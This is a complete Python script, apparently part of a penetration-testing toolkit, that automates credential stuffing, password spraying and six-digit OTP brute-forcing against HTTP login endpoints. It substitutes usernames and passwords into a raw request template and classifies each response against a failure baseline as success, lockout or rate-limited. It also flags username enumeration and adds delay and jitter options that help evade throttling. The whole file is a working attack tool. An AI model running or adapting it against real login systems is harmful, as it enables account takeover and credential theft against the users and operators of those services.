#!/usr/bin/env python3
"""auth_spray.py - credential stuffing / password spraying / OTP brute driver
(api-broken-auth).

Drives a raw HTTP login request template (with ^USER^ / ^PASS^ markers) over
a username x password list, a user:pass combo file, or an OTP list. Baselines
the failure signature with random credentials, then classifies each attempt
as success / possible-success / fail / lockout / rate-limited / anomaly from
status, body-length delta, match strings, Retry-After, and timing. Writes a
JSON report and a rupu-ingestible work-unit file (atomic writes).

Template (markers are substituted with content-type aware escaping):

    POST /v1/login HTTP/1.1
    Host: api.example.com
    Content-Type: application/json

    {"username":"^USER^","password":"^PASS^"}

Examples:
  python3 scripts/auth_spray.py --template login.req --scheme https \
      --users users.txt --passwords seasons.txt --mode spray --delay 0.5 \
      --fail-string 'invalid credentials'

  python3 scripts/auth_spray.py --template login.req --pairs combos.txt \
      --success-string '"token"' --out reports/api-broken-auth-spray.json

  # OTP brute: template carries the session cookie, ^PASS^ is the code
  seq -w 000000 999999 > otps.txt
  python3 scripts/auth_spray.py --template otp.req --users <(echo x) \
      --passwords otps.txt
"""

import argparse
import http.client
import json
import os
import random
import ssl
import statistics
import string
import sys
import tempfile
import time
import urllib.parse

LOCKOUT_WORDS = ("locked", "lockout", "suspended", "disabled")

TITLE_HINTS = {
    "valid-credentials": ["login succeeded with sprayed/stuffed credentials",
                          "mark login endpoint exploited; report via finding-report",
                          "feed credential to phase 4 authorization testing"],
    "possible-valid-credentials": ["response deviated from failure baseline",
                                   "replay manually and confirm a session/token"],
    "login-no-rate-limit": ["many attempts, no 429/lockout observed",
                            "report brute-force exposure via finding-report"],
    "username-enumeration": ["per-user response signature differs",
                             "verify with manual differential requests"],
}


def atomic_write(path, obj):
    d = os.path.dirname(path) or "."
    os.makedirs(d, exist_ok=True)
    fd, tmp = tempfile.mkstemp(dir=d, prefix=".tmp-", suffix=".json")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            json.dump(obj, f, indent=2)
            f.write("\n")
        os.replace(tmp, path)
    except BaseException:
        if os.path.exists(tmp):
            os.unlink(tmp)
        raise


def parse_template(text):
    text = text.replace("\r\n", "\n")
    head, _, body = text.partition("\n\n")
    lines = [ln for ln in head.split("\n") if ln.strip()]
    parts = lines[0].split()
    method, path = parts[0], parts[1]
    headers = []
    for line in lines[1:]:
        name, _, val = line.partition(":")
        headers.append((name.strip(), val.strip()))
    return method, path, headers, body


def esc(value, ctype):
    c = (ctype or "").lower()
    if "json" in c:
        return json.dumps(value)[1:-1]
    if "x-www-form-urlencoded" in c:
        return urllib.parse.quote(value, safe="")
    return value


def build_attempt(tpl, user, password):
    method, path, headers, body = tpl
    ctype = ""
    for k, v in headers:
        if k.lower() == "content-type":
            ctype = v
    p = (path.replace("^USER^", urllib.parse.quote(user, safe=""))
             .replace("^PASS^", urllib.parse.quote(password, safe="")))
    hs = []
    for k, v in headers:
        if k.lower() == "content-length":
            continue
        hs.append((k, v.replace("^USER^", user).replace("^PASS^", password)))
    b = body
    if b:
        b = b.replace("^USER^", esc(user, ctype)).replace("^PASS^", esc(password, ctype))
    return method, p, hs, b


def send_attempt(scheme, host, port, method, path, headers, body, timeout, insecure):
    ctx = ssl._create_unverified_context() if insecure else ssl.create_default_context()
    if scheme == "https":
        conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
    hdrs = {k: v for k, v in headers}
    data = body.encode("utf-8") if body else None
    t0 = time.monotonic()
    try:
        conn.request(method, path, body=data, headers=hdrs)
        resp = conn.getresponse()
        raw = resp.read()
        return {"status": resp.status, "length": len(raw),
                "elapsed_ms": round((time.monotonic() - t0) * 1000, 1),
                "retry_after": resp.getheader("Retry-After"),
                "location": resp.getheader("Location"),
                "body": raw.decode("utf-8", "replace")}
    except Exception as e:
        return {"status": None, "length": 0,
                "elapsed_ms": round((time.monotonic() - t0) * 1000, 1),
                "retry_after": None, "location": None,
                "error": str(e)[:200], "body": ""}
    finally:
        conn.close()


def classify(res, base, args):
    if res.get("status") is None:
        return "error"
    body = res.get("body", "")
    low = body.lower()
    if res["status"] == 429 or res.get("retry_after"):
        return "rate-limited"
    if res["status"] == 423 or any(w in low for w in LOCKOUT_WORDS):
        return "lockout"
    if args.success_string and args.success_string in body:
        return "success"
    if args.fail_string:
        return "fail" if args.fail_string in body else "success"
    if base:
        if res["status"] != base["status"]:
            if res["status"] in (200, 201, 302, 303):
                return "possible-success"
            return "anomaly"
        if abs(res["length"] - base["length"]) > max(64, base["length"] // 10):
            return "possible-success"
    return "fail"


def load_list(path):
    out = []
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.rstrip("\n")
            if line and not line.startswith("#"):
                out.append(line)
    return out


def attempts_iter(args):
    if args.pairs:
        for line in load_list(args.pairs):
            u, _, p = line.partition(":")
            yield u, p
        return
    users = load_list(args.users)
    passwords = load_list(args.passwords)
    if args.mode == "spray":
        for p in passwords:
            for u in users:
                yield u, p
    else:  # stuffing: all passwords per user
        for u in users:
            for p in passwords:
                yield u, p


def randstr(n=12):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def main():
    ap = argparse.ArgumentParser(description="login spray/stuffing/OTP driver")
    ap.add_argument("--template", required=True, help="raw HTTP request file with ^USER^/^PASS^")
    ap.add_argument("--scheme", default="https", choices=["https", "http"])
    ap.add_argument("--host", default=None, help="override template Host header")
    ap.add_argument("--port", type=int, default=None)
    ap.add_argument("--users", help="username list file")
    ap.add_argument("--passwords", help="password/OTP list file")
    ap.add_argument("--pairs", help="user:pass combo file (credential stuffing)")
    ap.add_argument("--mode", default="stuffing", choices=["stuffing", "spray"],
                    help="iteration order when using --users/--passwords")
    ap.add_argument("--success-string", default=None, help="substring proving success")
    ap.add_argument("--fail-string", default=None, help="substring proving failure")
    ap.add_argument("--delay", type=float, default=0.0, help="seconds between attempts")
    ap.add_argument("--jitter", type=float, default=0.0, help="random extra delay 0..jitter")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification")
    ap.add_argument("--stop-on-success", action="store_true")
    ap.add_argument("--out", default="reports/api-broken-auth-spray.json")
    ap.add_argument("--units-out", default="reports/api-broken-auth-spray-units.json")
    args = ap.parse_args()
    if not args.pairs and not (args.users and args.passwords):
        ap.error("provide --pairs or both --users and --passwords")

    with open(args.template, encoding="utf-8", errors="replace") as f:
        tpl = parse_template(f.read())
    method, path, headers, _ = tpl

    host = args.host
    if not host:
        for k, v in headers:
            if k.lower() == "host":
                host = v
                break
    if not host:
        ap.error("no Host header in template and no --host given")
    if ":" in host and not args.port:
        host, _, p = host.partition(":")
        args.port = int(p)
    port = args.port or (443 if args.scheme == "https" else 80)
    endpoint = "%s %s://%s%s" % (method, args.scheme, host, path)

    # Baseline: two random-credential failures.
    base_samples = []
    for _ in range(2):
        m, pth, hs, b = build_attempt(tpl, "zz" + randstr(), randstr(16))
        r = send_attempt(args.scheme, host, port, m, pth, hs, b, args.timeout, args.insecure)
        if r.get("status") is not None:
            base_samples.append(r)
    base = None
    if base_samples:
        base = {"status": base_samples[-1]["status"],
                "length": int(statistics.mean(s["length"] for s in base_samples))}
        print("baseline failure: status=%s length=%s" % (base["status"], base["length"]))
    else:
        print("warning: baseline failed; classification will rely on match strings")

    attempts = []
    successes = []
    rate_or_lock = 0
    print("%-28s %-20s %-6s %-8s %-9s %s" % ("user", "pass", "status", "length", "ms", "class"))
    for user, password in attempts_iter(args):
        m, pth, hs, b = build_attempt(tpl, user, password)
        res = send_attempt(args.scheme, host, port, m, pth, hs, b, args.timeout, args.insecure)
        cls = classify(res, base, args)
        rec = {"user": user, "password": password, "status": res.get("status"),
               "length": res.get("length"), "elapsed_ms": res.get("elapsed_ms"),
               "retry_after": res.get("retry_after"), "class": cls}
        attempts.append(rec)
        print("%-28s %-20s %-6s %-8s %-9s %s" % (
            user[:28], password[:20], res.get("status"), res.get("length"),
            res.get("elapsed_ms"), cls))
        if cls in ("success", "possible-success"):
            successes.append(rec)
            if args.stop_on_success and cls == "success":
                break
        if cls in ("rate-limited", "lockout"):
            rate_or_lock += 1
        if args.delay or args.jitter:
            time.sleep(args.delay + random.uniform(0, args.jitter))

    # Per-user signature stats (username enumeration via differential responses/timing).
    per_user = {}
    for a in attempts:
        per_user.setdefault(a["user"], []).append(a)
    user_stats = {}
    for u, recs in per_user.items():
        lens = [r["length"] for r in recs if r["length"] is not None]
        times = [r["elapsed_ms"] for r in recs if r["elapsed_ms"] is not None]
        user_stats[u] = {"attempts": len(recs),
                         "mean_length": round(statistics.mean(lens), 1) if lens else None,
                         "mean_ms": round(statistics.mean(times), 1) if times else None}
    enum_candidates = []
    if len(user_stats) >= 3:
        all_lens = [s["mean_length"] for s in user_stats.values() if s["mean_length"]]
        if all_lens:
            med = statistics.median(all_lens)
            enum_candidates = [u for u, s in user_stats.items()
                               if s["mean_length"] and abs(s["mean_length"] - med) > max(64, med // 10)]

    no_rate_limit = len(attempts) >= 20 and rate_or_lock == 0
    units = []
    n = 0
    for s in [a for a in attempts if a["class"] == "success"]:
        n += 1
        units.append({"id": "spr-%03d" % n, "title": "valid-credentials",
                      "targets": [endpoint[:512], ("user:" + s["user"])[:256]],
                      "hints": TITLE_HINTS["valid-credentials"]})
    for s in [a for a in attempts if a["class"] == "possible-success"]:
        n += 1
        units.append({"id": "spr-%03d" % n, "title": "possible-valid-credentials",
                      "targets": [endpoint[:512], ("user:" + s["user"])[:256]],
                      "hints": TITLE_HINTS["possible-valid-credentials"]})
    if no_rate_limit:
        n += 1
        units.append({"id": "spr-%03d" % n, "title": "login-no-rate-limit",
                      "targets": [endpoint[:512]],
                      "hints": TITLE_HINTS["login-no-rate-limit"]})
    if enum_candidates:
        n += 1
        units.append({"id": "spr-%03d" % n, "title": "username-enumeration",
                      "targets": [endpoint[:512]] + [u[:256] for u in enum_candidates[:20]],
                      "hints": TITLE_HINTS["username-enumeration"]})

    report = {"tool": "auth_spray", "endpoint": endpoint, "baseline": base,
              "attempts": attempts, "user_stats": user_stats,
              "summary": {"total": len(attempts),
                          "successes": [s["user"] for s in successes],
                          "no_rate_limit": no_rate_limit,
                          "rate_limit_or_lockout_events": rate_or_lock,
                          "enumeration_candidates": enum_candidates}}
    atomic_write(args.out, report)
    atomic_write(args.units_out, units)
    print("\nattempts=%d successes=%d rate/lockout=%d no_rate_limit=%s" % (
        len(attempts), len(successes), rate_or_lock, no_rate_limit))
    print("report: %s\nunits:  %s" % (args.out, args.units_out))
    return 0


if __name__ == "__main__":
    sys.exit(main())
